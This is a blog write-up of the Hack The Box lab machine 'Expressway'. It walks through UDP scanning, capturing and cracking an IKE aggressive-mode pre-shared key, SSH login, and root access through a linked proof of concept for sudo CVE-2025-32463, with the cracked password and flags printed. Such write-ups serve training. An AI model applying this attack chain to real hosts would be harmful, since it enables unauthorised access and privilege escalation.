---
layout: post
title: "Hack The Box: Expressway"
date: 2026-03-08
categories: [HackTheBox, Writeup]
tags: [Linux, easy, psk-crack, IKE, privilege-escalation]
permalink: /posts/Expressway/
toc: true
---

![Description](/assets/images/Expressway/app.hackthebox.com_machines_736.png)

Expressway is an easy-difficulty linux machine from Hack The Box where we start with Enumeration (TCP/UDP Scans) --> IKE-Scan --> PSK Cracking (psk-crack) --> SSH Access --> Sudo CVE Check --> Exploit Transfer & Execution

## **Enumeration**

### Nmap Scan

```bash
┌──(sanke㉿vbox)-[~/Downloads]
└─$ nmap 10.10.11.87 -A -v
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 08:18 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Discovered open port 22/tcp on 10.10.11.87
Completed SYN Stealth Scan at 08:18, 1.71s elapsed (1000 total ports)
Initiating Service scan at 08:18
Scanning 1 service on 10.10.11.87
Completed Service scan at 08:18, 0.13s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.11.87
Retrying OS detection (try #2) against 10.10.11.87
Retrying OS detection (try #3) against 10.10.11.87
Retrying OS detection (try #4) against 10.10.11.87
Retrying OS detection (try #5) against 10.10.11.87
Initiating Traceroute at 08:19

```

So, I didnt found anything here and only 22/tcp ssh open port. I tried also using the rustscan to scan faster for all ports of tcp and found nothing.

And then I realised that I need to check for the UDP ports.

```bash
┌──(sanke㉿vbox)-[~/Downloads]
└─$ nmap 10.10.11.87 -v -sU
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 09:32 EDT
Initiating Ping Scan at 09:32
Scanning 10.10.11.87 [4 ports]
Completed Ping Scan at 09:32, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:32
Completed Parallel DNS resolution of 1 host. at 09:32, 0.04s elapsed
Initiating UDP Scan at 09:32
Nmap scan report for 10.10.11.87
Host is up (0.042s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

```

All the ports are filtered and only the 500/tcp is open which can lead us to something.

## **Exploitation**

Running ike-scan against the target (10.10.11.87) in Aggressive Mode identified the IKEv1 configuration.

```bash
┌──(sanke㉿vbox)-[~/Downloads]
└─$ sudo ike-scan -A -P 10.10.11.87                     
[sudo] password for sanke: 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=074437f247b950c8) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
dddd33bd847994a95a94b7d8b4683acf3d4b9a19c76697e7bbae48c0bf80fa0cf1afac4037c42f4755545bbbccce2fee34ec602b2bee1402be7321a2720297537b1440d7b0cb1284365e106f66694f2449e1abceedde34f319b6f0c7ba10acedda296b3bad1919647f15cb43d4a44f6382881ef3e5b2e2bab00328edefbdc717:83ece5e6c582cb9b4d798dfa467e4370efba8fbf9a1e150e9e3d11f809c7335f59de2e91587269b03df8a7ac795879a6b4062ae0bb1c765d8259c7e097e0ea1132714d7cc5077af2c61c9cbd5e1982458de021fab6374594b9491b2607b289215e958fc1c1d623f454e1521a4b4b29d1cfe695f26f7f24469f1c5cb1ea2651fb:074437f247b950c8:e7326ce2c469073e:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:2ff044a6a09162560ca7213581963c0c66d4e116:a777518ffc809508029a66c8aaa44f7572129739225098f547592ef220bf7489:0a793a0705859d4f7aa3d171b6f487c415fec353

```

The output revealed an IKEv1 Aggressive Mode configuration with the following parameters:

- **Encryption**: 3DES
- **Hash**: SHA1
- **Diffie-Hellman Group**: Group 2 (modp1024)
- **Authentication**: Pre-Shared Key (PSK)
- **ID**: ike@expressway.htb
- **Additional Features**: XAUTH and Dead Peer Detection (DPD) v1.0
- **PSK Hash**: Saved for offline cracking.

The “-P” flag stored the PSK parameters in a file, which were later used for cracking the PSK.

So now we only need to crack the PSK hash to get our password. But first we need to use this command to filter only the hash in the file that was stored.

```bash
awk '/^IKE PSK parameters/{ getline; print; exit }' ike_psk_params.txt > psk_line.txt
```

Now for the crackingphase, I used the psk-crack to get the flag.

```bash
┌──(sanke㉿vbox)-[~/Downloads]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt psk_line.txt

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash bc449831f6d3c20f6a65125ba2dd70295e9b87b3
Ending psk-crack: 8045040 iterations in 5.309 seconds (1515279.48 iterations/sec)

```

Let’s gooo!! We have our password “freakingrockstarontheroad” 

Now, all we need to is to connect into the ssh to get the user flag.

```bash
┌──(sanke㉿vbox)-[~/Downloads]
└─$ ssh ike@10.10.11.87 -o PasswordAuthentication=yes
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password: 
Last login: Mon Sep 22 16:11:56 BST 2025 from 10.10.14.239 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 22 16:12:33 2025 from 10.10.14.131
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
825494d4fdacb673df9ee49f9c7ea58a
ike@expressway:~$ 
```

## **Privilege Escalation**

Like always we do check the “sudo -l” before trying anything else.

```bash
ike@expressway:~$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
```

This time we weren’t like in this finding but what i did is trying to check for the sudo version as I heard recently that there was a new CVE with HIGH CVSS found in the “sudo”. So, I checked the version of sudo and guess what i found.

```bash
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17

```

Sudo version is “1.9.17” which is vulnrable to the new cve “**CVE-2025-32463**”. I downloaded the script from this github repository. 

https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

Then, I transfered the POC to the victim machine using “scp” this time.

```bash
┌──(sanke㉿vbox)-[~/Downloads]
└─$ scp ~/Downloads/sudo-chwoot.sh ike@10.10.11.87:/home/ike/ 

ike@10.10.11.87's password: 
sudo-chwoot.sh 
```

Now, all I need to do is execute the script and get the root.

```bash
ike@expressway:~$ chmod +x sudo-chwoot.sh 
ike@expressway:~$ ./sudo-chwoot.sh 
woot!
root@expressway:/# cat /root/root.txt 
a786dbf242b15d757a4f9a745cf5e3f0
```

Let’ss gooo!! This is it for the first new machine of season 9. Too easy to be honest and straight forward !!!!
